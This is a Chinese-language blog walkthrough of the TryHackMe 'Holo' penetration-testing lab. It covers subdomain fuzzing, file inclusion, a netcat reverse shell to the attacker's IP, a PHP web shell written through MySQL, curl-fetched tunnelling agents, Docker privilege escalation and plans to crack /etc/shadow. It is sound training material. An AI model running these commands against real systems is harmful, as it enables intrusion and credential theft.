@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="偶遇域强者，被凌迟三个晚上拼尽全力无法战胜">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM打靶日寄17-Holo">
+<meta property="og:url" content="http://noone40404.github.io/2024/10/28/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8417%EF%BC%9AHolo/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="偶遇域强者，被凌迟三个晚上拼尽全力无法战胜">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671edf3cd29ded1a8caa7044.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671edf9ed29ded1a8caac020.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671ee0e9d29ded1a8cab9c91.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671edfe5d29ded1a8caafc46.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671ee689d29ded1a8cafa517.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671ee73bd29ded1a8cb036bf.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671eec39d29ded1a8cb3819b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f01b7d29ded1a8cc77247.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f0240d29ded1a8cc7f454.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f06f7d29ded1a8ccc9fe9.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f0730d29ded1a8cccc415.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f076ed29ded1a8ccce6e7.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f0915d29ded1a8cce6026.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f09add29ded1a8cced36f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/671f09e5d29ded1a8ccefa51.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67219e05d29ded1a8cd98c99.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67219e76d29ded1a8cda010d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67219eb9d29ded1a8cda4561.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67236cb6d29ded1a8c5af57d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672374c8d29ded1a8c624329.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67237008d29ded1a8c5e2491.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67237179d29ded1a8c5fa835.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672371e8d29ded1a8c6001e8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6723722ad29ded1a8c603421.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672372e8d29ded1a8c60ce3d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672378dfd29ded1a8c658edf.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672379f6d29ded1a8c666702.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67237a2dd29ded1a8c669567.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67237af7d29ded1a8c674c73.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/672475d6d29ded1a8c1d4b28.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67247c3cd29ded1a8c22dbb2.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67247dedd29ded1a8c2488a3.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67247f25d29ded1a8c25d6a0.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728c60fd29ded1a8cde2f00.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728c63fd29ded1a8cde6062.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728c69ed29ded1a8cdebe68.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728cb57d29ded1a8ce26602.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728cbbdd29ded1a8ce2ae18.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728ccd4d29ded1a8ce37df0.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6728cd36d29ded1a8ce3c960.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6731ec33d29ded1a8c7c2575.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6731ece1d29ded1a8c7cb172.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6731edded29ded1a8c7d6e49.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/67360c95d29ded1a8cc485bb.jpg">
+<meta property="article:published_time" content="2024-10-28T05:10:00.000Z">
+<meta property="article:modified_time" content="2024-11-17T03:03:46.685Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/671edf3cd29ded1a8caa7044.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2024/10/28/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8417%EF%BC%9AHolo/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM打靶日寄17-Holo | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2024/10/28/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8417%EF%BC%9AHolo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM打靶日寄17-Holo
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-28 13:10:00" itemprop="dateCreated datePublished" datetime="2024-10-28T13:10:00+08:00">2024-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-17 11:03:46" itemprop="dateModified" datetime="2024-11-17T11:03:46+08:00">2024-11-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">偶遇域强者，被凌迟三个晚上拼尽全力无法战胜</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p><code>Initial Recon</code></p>
+<p>  扫一扫网段先</p>
+<p>  <img src="https://pic.imgdb.cn/item/671edf3cd29ded1a8caa7044.png" alt=""></p>
+<p>  扫出来 <code>33</code> 和 <code>250</code></p>
+<ul>
+<li><p><code>33</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/671edf9ed29ded1a8caac020.png" alt=""></p>
+<p>  但这里扫的不全，应该用全端口扫描 <code>-p-</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/671ee0e9d29ded1a8cab9c91.png" alt=""></p>
+</li>
+<li><p><code>250</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/671edfe5d29ded1a8caafc46.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p><code>L-SRV01</code></p>
+<ul>
+<li><p><code>vhost</code> 虚拟主机与子域名</p>
+<p>  在一台服务器上运行多个网站，只需要一个额外的表头 <code>Host</code> 来告诉服务器流量应该发送给哪个 <code>vhost</code>，<code>wordpress</code> 或 <code>Squarespace</code> 等托管服务经常这么做</p>
+<p>  也就是不同的域名会被解析到同一 <code>ip</code> 上</p>
+<p>  <img src="https://pic.imgdb.cn/item/671ee689d29ded1a8cafa517.png" alt=""></p>
+<p>  在网站的源码里面找到一个域名 <code>holo.live</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/671ee73bd29ded1a8cb036bf.png" alt=""></p>
+<p>  同时在 <code>network</code> 里面发现 <code>holo.live</code> 的资源没有加载</p>
+<p>  所以选择让 <code>holo.live</code> 解析到 <code>ip</code> 上，在 <code>/etc/hosts</code>：</p>
+<p>  <img src="https://pic.imgdb.cn/item/671eec39d29ded1a8cb3819b.png" alt=""></p>
+<p>  随后图片加载成功</p>
+<p>  随后使用 <code>wfuzz</code> 来爆破子域名：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u www.holo.live -H &quot;Host: FUZZ.holo.live&quot; -w /root/subdomains-top1million-110000.txt --hw 1402</span><br></pre></td></tr></table></figure>
+<p>  这里 <code>--hw 1402</code> 是在过滤 <code>words</code> 数为 $1402$ 的情况，直接扫描可以发现，即使大部分子域名爆破结果是 $200$ 这种情况是网站指定了一个自定义的错误页面，返回码是 $200$ ，但实际上起到了一个 $404$ 页面的作用，称之为软 $404$。</p>
+<p>  同理有：</p>
+<ul>
+<li><code>—hc</code> 隐藏状态代码</li>
+<li><code>—hw</code> 隐藏字数</li>
+<li><code>—hl</code> 隐藏行数</li>
+<li><p><code>—hh</code> 隐藏字符数</p>
+<p>那么这个软 $404$ 页面的特征就是 <code>words</code> 数为 $1402$ ，将其过滤，得到子域名爆破的结果</p>
+<p><img src="https://pic.imgdb.cn/item/671f01b7d29ded1a8cc77247.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>子域名目录</p>
+<p>  继续，我们扫描子域名目录，但首先需要把子域名也加入到 <code>hosts</code> 里面</p>
+<p>  <img src="https://pic.imgdb.cn/item/671f0240d29ded1a8cc7f454.png" alt=""></p>
+<p>  通常爆破目录我用的是 <code>dirsearch</code> ，这里正好学下别的</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u [url] -w [wordlist] -t [线程数] -x [后缀]</span><br><span class="line">wfuzz -u [url] -w [wordlist]</span><br></pre></td></tr></table></figure>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://dev.holo.live/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,txt,zip,bak,rar,sql</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>dev</p>
+<p>  <img src="https://pic.imgdb.cn/item/671f06f7d29ded1a8ccc9fe9.png" alt=""></p>
+</li>
+<li><p>admin</p>
+<p> <img src="https://pic.imgdb.cn/item/671f0730d29ded1a8cccc415.png" alt=""></p>
+<p> <img src="https://pic.imgdb.cn/item/671f076ed29ded1a8ccce6e7.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>文件包含：</p>
+<p>  在 <code>dev</code> 的 <code>talents.php</code> 下，发现图片是从 <code>img.php</code> 请求得到的，<del>此事在THM的问题中亦有记载</del></p>
+<p>  <img src="https://pic.imgdb.cn/item/671f0915d29ded1a8cce6026.png" alt=""></p>
+<p>  那么不得不试试文件包含了，发现一点过滤都没有：</p>
+<p>  <img src="https://pic.imgdb.cn/item/671f09add29ded1a8cced36f.png" alt=""></p>
+<p>  直接读上面发现的管理员认证文件：</p>
+<p>  <img src="https://pic.imgdb.cn/item/671f09e5d29ded1a8ccefa51.png" alt=""></p>
+<p>  <code>admin:DBManagerLogin!</code></p>
+<p>  同时还有一个更高权限用户的用户名 <code>gurag</code></p>
+</li>
+<li><p>命令执行</p>
+<p>  拿获得的账密进后台 <code>dashboard.php</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/67219e05d29ded1a8cd98c99.png" alt=""></p>
+<p>  没什么能点进去的东西，看下源码</p>
+<p>  <img src="https://pic.imgdb.cn/item/67219e76d29ded1a8cda010d.png" alt=""></p>
+<p>  发现有注释标着 <code>cmd</code> 的命令执行，试一下：</p>
+<p>  <img src="https://pic.imgdb.cn/item/67219eb9d29ded1a8cda4561.png" alt=""></p>
+<p>  直接反弹 <code>shell</code> 了</p>
+<p>  <del>不对，我用的attackbox怎么还连不上</del></p>
+<p>  <del>草，<code>ip</code> 填错了。。。</del></p>
+<p>  <img src="https://pic.imgdb.cn/item/67236cb6d29ded1a8c5af57d.png" alt=""></p>
+<p>  要用 <code>tun0</code> 那个连</p>
+<p>  然后反弹 <code>shell</code> 的命令很奇怪的不能用 <code>bash</code> ，要 <code>nc</code> 连回来：</p>
+<p>  <code>nc 10.50.104.23 443 -e /bin/sh</code></p>
+<p>  这里顺手找到第一个 <code>flag</code> :</p>
+<p>  <img src="https://pic.imgdb.cn/item/672374c8d29ded1a8c624329.png" alt=""></p>
+</li>
+<li><p><code>shell</code> 升级：</p>
+<p>  有很多种方案，一种是传马转 <code>msf</code> ，但我用多了，换一种：</p>
+<p>  连上 <code>shell</code> 以后：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br><span class="line">export XTERM=term</span><br><span class="line">Ctrl + Z</span><br><span class="line">stty raw -echo; fg</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/67237008d29ded1a8c5e2491.png" alt=""></p>
+</li>
+<li><p><code>docker</code> 逃逸</p>
+<ul>
+<li><p><code>docker</code> 容器的特征：</p>
+<ul>
+<li><p><code>ps aux</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/67237179d29ded1a8c5fa835.png" alt=""></p>
+<p>  相较于正常的环境来说进程太少了：</p>
+<p>  <img src="https://pic.imgdb.cn/item/672371e8d29ded1a8c6001e8.png" alt=""></p>
+</li>
+<li><p><code>.dockerenv</code></p>
+<p>  在根目录下能找到 <code>.dockerenv</code> ，该文件从主机操作系统提供环境变量。即使未提供任何环境变量，它也会存在于容器中</p>
+<p>  <img src="https://pic.imgdb.cn/item/6723722ad29ded1a8c603421.png" alt=""></p>
+</li>
+<li><p><code>cgroups</code></p>
+<p>  在 <code>/proc/1</code> 目录下： <code>cat cgourp</code> 能看到其路径包含 <code>docker</code> 字样：</p>
+<p>  <img src="https://pic.imgdb.cn/item/672372e8d29ded1a8c60ce3d.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>扫描</p>
+<p>  在得知是 <code>docker</code> 容器后，需要继续来扫描内网和端口信息：</p>
+<p>  虽然 <code>THM</code> 在这里介绍了 <code>bash</code> 和 <code>py</code> 脚本来扫，但是正常实战下还是传 <code>fscan</code> 或者 <code>nmap</code> 来扫比较多：</p>
+<p>  注意靶机里面没有 <code>wget</code> ，用 <code>curl -O</code> 下载：</p>
+<p>  <img src="https://pic.imgdb.cn/item/672378dfd29ded1a8c658edf.png" alt=""></p>
+<p>  扫描前先用 <code>route -n</code> 查看网关：</p>
+<p>  <img src="https://pic.imgdb.cn/item/672379f6d29ded1a8c666702.png" alt=""></p>
+<p>  得到网关 <code>192.168.100.1</code> ，扫一下：</p>
+<p>  <img src="https://pic.imgdb.cn/item/67237a2dd29ded1a8c669567.png" alt=""></p>
+</li>
+<li><p>检查数据库：</p>
+<p>  根据扫描结果，网关开启了 <code>3306</code> ，即 <code>mysql</code></p>
+<p>  而且注意反弹 <code>shell</code> 刚连进来的目录 <code>/var/www/admin</code> ：这里有外部访问不到的 <code>db_connect.php</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/67237af7d29ded1a8c674c73.png" alt=""></p>
+<p>  拿到数据库账密： <code>admin:!123SecureAdminDashboard321!</code></p>
+<p>  登录进去</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p -h 192.168.100.1</span><br></pre></td></tr></table></figure>
+<p>  可以在 <code>user</code> 表里面看到另一个用户 <code>gurag</code></p>
+</li>
+<li><p>利用 <code>mysql</code> 命令执行来 <code>docker</code> 逃逸</p>
+<p>  思路是由于当前管理员用户有写入权限，那么可以通过 <code>select ... INTO OUTFILE</code> 来往 <code>192.168.100.1</code> 目录内写文件</p>
+<p>  又由于其开了 <code>web</code> 服务，那么可以往其网站上写马，再用 <code>docker</code> 内的 <code>rce</code> 通过 <code>curl</code> 触发反弹 <code>shell</code> ：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/672475d6d29ded1a8c1d4b28.png" alt=""></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.100.1:8080/shell.php?cmd=[反弹shell命令]</span><br></pre></td></tr></table></figure>
+<p>  令人感慨的是，这里又反弹不了，正好练一下开隧道吧：</p>
+</li>
+<li><p>隧道设置</p>
+<p>  这里根据<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15226">这篇文章</a>用 <a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway/releases"><code>stowaway</code></a></p>
+<p>  攻击机先下载 <code>admin</code> 和 <code>agent</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/67247c3cd29ded1a8c22dbb2.png" alt=""></p>
+<p>  然后开 <code>http.server</code> ，用 <code>L-SRV02:192.168.100.100</code> <code>curl</code> 下来，注意目录的权限问题</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.50.104.23:8000/linux_x64_agent &gt; linux_x64_agent</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/67247dedd29ded1a8c2488a3.png" alt=""></p>
+<p>  然后在攻击机上 <code>./linux_x64_admin -l [port]</code></p>
+<p>  <code>L-SRV01</code> 上 <code>./linux_x64_agent -c [attack_ip]:[port]</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/67247f25d29ded1a8c25d6a0.png" alt=""></p>
+<p>  <code>use 0</code> 切换到管理面板，然后</p>
+<p>  <code>socks [port]</code></p>
+<p>  在本地的 <code>port</code> 端口开启 <code>socks</code> 代理</p>
+<p>  这里有点看脸，理论上是可以转发成功的，如果不行就换个端口并加上用户名密码试试：</p>
+<p>  <img src="https://pic.imgdb.cn/item/6728c60fd29ded1a8cde2f00.png" alt=""></p>
+<p>  然后用 <code>foxyproxy</code> 等代理插件配置一下：</p>
+<p>  <img src="https://pic.imgdb.cn/item/6728c63fd29ded1a8cde6062.png" alt=""></p>
+<p>  然后可以畅游 <code>LSRV01</code> 了，即 <code>192.168.100.1:8080</code></p>
+<p>  也可以连上刚刚用数据库传的马：</p>
+<p>  <img src="https://pic.imgdb.cn/item/6728c69ed29ded1a8cdebe68.png" alt=""></p>
+<p>  同理，这个也可以用来作为跳板：从 <code>LSRV02</code> 上下载客户端：</p>
+<p>  注意这里 <code>python</code> 开 <code>http</code> 服务的时候加上 <code>&amp;</code> 参数来后台运行</p>
+<p>  <img src="https://pic.imgdb.cn/item/6728cb57d29ded1a8ce26602.png" alt=""></p>
+<p>  然后用网页的 <code>shell</code> 下载：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.1:8080/shell.php?cmd=curl http://192.168.100.100:8000/linux_x64_agent &gt; linux_x64_agent</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/6728cbbdd29ded1a8ce2ae18.png" alt=""></p>
+<p>  然后通过服务端的 <code>listen</code> 命令在 <code>LSRV02</code> 上加一个监听，然后 <code>LSRV01</code> 那里先升级一下权限再连一下：</p>
+<p>  <img src="https://pic.imgdb.cn/item/6728ccd4d29ded1a8ce37df0.png" alt=""></p>
+<p>  <img src="https://pic.imgdb.cn/item/6728cd36d29ded1a8ce3c960.png" alt=""></p>
+<p>  然后 <code>use 1</code> 转到 <code>LSRV01</code> ，再用 <code>shell</code> 命令</p>
+<p>  <img src="https://pic.imgdb.cn/item/6731ec33d29ded1a8c7c2575.png" alt=""></p>
+<p>  这里理论上会有一个 <code>user.txt</code> ，但我这个房间里的被人删掉了，愤怒喵</p>
+<p>  <code>HOLO&#123;3792d7d80c4dcabb8a533afddf06f666&#125;</code></p>
+</li>
+<li><p><code>suid</code> 提权</p>
+<p>  <img src="https://pic.imgdb.cn/item/6731ece1d29ded1a8c7cb172.png" alt=""></p>
+<p>  <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/docker/#suid">注意到可以使用 <code>docker</code> 提权</a></p>
+<p>  但注意当前靶机不存在 <code>alpine</code> 镜像，无法下载，所以指定一个靶机上存在的镜像，用 <code>docker images</code> 查看：即 <code>Ubuntu:18:04</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/6731edded29ded1a8c7d6e49.png" alt=""></p>
+<p>  在 <code>/root</code> 下找到 <code>HOLO&#123;e16581b01d445a05adb2e6d45eb373f7&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><p>可持久化建立</p>
+<p>  为了方便横向，可以把靶机上面的 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 下载到本地破解：</p>
